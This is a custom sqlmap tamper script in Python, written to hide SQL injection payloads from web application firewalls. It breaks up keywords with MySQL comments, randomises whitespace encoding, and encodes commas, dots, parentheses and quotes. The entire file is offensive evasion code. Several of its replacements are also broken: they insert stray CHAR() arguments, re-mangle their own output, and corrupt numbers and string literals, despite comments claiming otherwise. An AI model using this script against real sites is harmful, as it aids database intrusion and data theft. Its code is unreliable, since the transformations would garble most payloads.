#!/usr/bin/env python

import re
import random
from urllib.parse import quote

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW # Set a low priority to ensure it runs late in the tampering chain

def tamper(payload, **kwargs):
    """
    Custom tamper script for sqlmap combining multi-layered obfuscation.
    Designed to bypass WAFs by:
    1. Obfuscating keywords using MySQL-specific comments and mixed case.
    2. Replacing spaces with varied encoded whitespace and comments.
    3. Encoding critical punctuation (parentheses, commas, dots) with CHAR() or hex.
    4. Adding junk comments to break pattern matching.
    """
    if payload:
        # Phase 1: Keyword Obfuscation and Split-Comments
        # This replaces keywords with a split, mixed-case, comment-laden version
        # e.g., SELECT -> S/*!%0A*/E/*!%09*/L/*!C*/E/*!T*/
        keywords = ["SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "ORDER BY", "GROUP BY", "SLEEP", "BENCHMARK", "CAST", "CONCAT", "IF", "CASE", "LIMIT"]
        for keyword in keywords:
            if re.search(r'\b{}\b'.format(re.escape(keyword)), payload, re.IGNORECASE):
                obfuscated_keyword = ""
                # Split keyword into parts and inject comments with various whitespace
                parts = [char for char in keyword.upper()]
                temp_obf = []
                for i, char in enumerate(parts):
                    temp_obf.append(char)
                    if i < len(parts) - 1:
                        # Introduce various comment types and encoded whitespace
                        comment_type = random.choice([
                            "/*!{}*/".format(random.choice(['%0A', '%09', '---', 'x', 'a', '\r\n', '\n'])), # MySQL comments with encoded whitespace/junk
                            "/**/", # Simple multi-line comment
                            "/*{}*/".format(''.join(random.sample('abcdefg12345', random.randint(1, 5)))), # Random junk comment
                        ])
                        temp_obf.append(comment_type)
                obfuscated_keyword = "".join(temp_obf)
                payload = re.sub(r'\b{}\b'.format(re.escape(keyword)), obfuscated_keyword, payload, flags=re.IGNORECASE, count=1)


        # Phase 2: Space and Delimiter Obfuscation
        # Replace spaces with various encoded/commented forms
        space_replacements = [
            "/**/%0a",            # Multi-line comment + newline
            "/*!%0A*/",           # MySQL comment + newline
            "/*\t*/",             # Multi-line comment + tab
            "/*---*/",            # Multi-line comment with junk
            "/*!X*/",             # MySQL comment with junk character
            "%0a",                # Newline character
            "%0d%0a",             # Carriage return + newline
            "%09",                # Tab character
            "/*!%0b*/",           # Vertical tab
            "/*!%0c*/"            # Form feed
        ]
        # Replace all whitespace sequences (including newlines, tabs, etc.) with a random obfuscated space
        payload = re.sub(r'\s+', lambda x: random.choice(space_replacements), payload)

        # Obfuscate common delimiters that might trigger WAFs
        # Using CHAR() or HEX() encoding for crucial characters
        # Ensure it doesn't break function calls or numbers (e.g. 1.2)
        payload = payload.replace(',', '/*!,*/CHAR(44)') # Comma
        payload = payload.replace('.', '/*!.*/CHAR(46)') # Dot, often used in database.table.column
        
        # Phase 3: Parenthesis Obfuscation
        # WAFs often look for parentheses in sequence
        payload = payload.replace('(', 'CHAR(40)/*!%0A*/')
        payload = payload.replace(')', '/*!%09*/CHAR(41)')

        # Phase 4: String Quote Obfuscation (partial - for single quotes)
        # This is often handled by sqlmap's 'apostrophemask' but can be reinforced here
        # Note: Be cautious as over-tampering quotes can break sqlmap's ability to parse string literals
        # This will only affect single quotes, replacing them with hex encoding.
        # It's less disruptive than CHAR() function for every single quote.
        payload = payload.replace("'", "0x27") # Hex encode single quote

        # Phase 5: Random Junk Comment Insertion
        # Inject small, random comments to further break up patterns without changing logic
        if random.random() < 0.5: # 50% chance to add junk
            junk_comment = "/*!{}*/".format(''.join(random.sample('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', random.randint(3, 8))))
            insert_pos = random.randint(0, len(payload))
            payload = payload[:insert_pos] + junk_comment + payload[insert_pos:]

    return payload
